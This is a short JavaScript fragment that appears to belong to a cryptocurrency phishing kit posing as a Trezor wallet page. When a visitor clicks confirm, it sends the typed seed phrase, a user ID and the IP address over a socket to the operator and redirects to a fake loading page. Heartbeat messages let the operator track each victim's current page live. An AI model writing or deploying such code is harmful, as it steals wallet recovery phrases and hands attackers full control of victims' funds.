confirmBtn.addEventListener('click', () => {
    socket.emit('userSent', { start: '/cb_trezor', user: sessionStorage.getItem('user'), seed: seedPhrase.value, liveInput: false, ipAddress: ipAddress });
    window.location.href = './loading';
});

if (sessionStorage.getItem('user')) {
    socket.emit('heartbeat', { method: 'currPage', user: sessionStorage.getItem('user'), page: '/cb_trezor' });
} else {
    socket.emit('heartbeat', { method: 'newUser', user: 'Unknown', page: '/cb_trezor' });
}